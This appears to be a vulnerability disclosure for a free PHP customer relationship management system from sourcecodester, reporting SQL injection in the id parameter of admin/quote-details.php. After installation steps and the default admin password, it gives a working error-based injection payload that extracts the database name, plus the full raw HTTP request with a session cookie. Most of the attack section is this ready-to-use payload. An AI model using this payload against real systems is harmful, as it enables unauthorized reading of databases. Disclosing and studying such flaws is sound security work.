# Simple Customer Relationship Management (CRM) System has SQLI in /php-scrm/admin/quote-details.php
Author:Top-Zxp

vendors:https://www.sourcecodester.com/php/15895/simple-customer-relationship-management-crm-system-using-php-free-source-coude.html

## How to Run?

### Requirements

-   Download and Install any local web server such as XAMPP.
-   Download the provided source code zip file. (download button is located below)

### System Installation/Setup

-   Open your XAMPP Control Panel and start Apache and MySQL.
-   Extract the downloaded source code zip file.
-   Copy the extracted source code folder and paste it into the XAMPP's "htdocs" directory.
-   Browse the PHPMyAdmin in a browser. i.e. http://localhost/phpmyadmin
-   Create a new database named scrm_db.
-   Import the provided SQL file. The file is known as scrm_db.sql located inside the database folder.
-   Browse the Simple Customer Relationship Management (CRM) System in a browser. i.e. http://localhost/php-scrm/.

### Admin Default Access:

-   Username: admin
-   Password: admin123

## Payload
database:scrm_db

[+] Payload:php-scrm/admin/quote-details.php?1' and (select count(*) from information_schema.tables group by concat(0x7e,(select database()),0x7e ,floor(rand(0)*2))) --+

GET /php-scrm/admin/quote-details.php?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select database()),0x7e ,floor(rand(0)*2))) --+ HTTP/1.1
Host: 192.168.248.137
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.248.137/php-scrm/admin/quote-details.php?id=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lf9l068kt6hkbqhcettmhr0o3p
Connection: close

![image](https://user-images.githubusercontent.com/124124632/215967016-406966f1-31d3-45b1-b7d3-35104cb5be86.png)
![image](https://user-images.githubusercontent.com/124124632/215967081-89144946-7652-4412-a0cd-cecbcfaa0007.png)
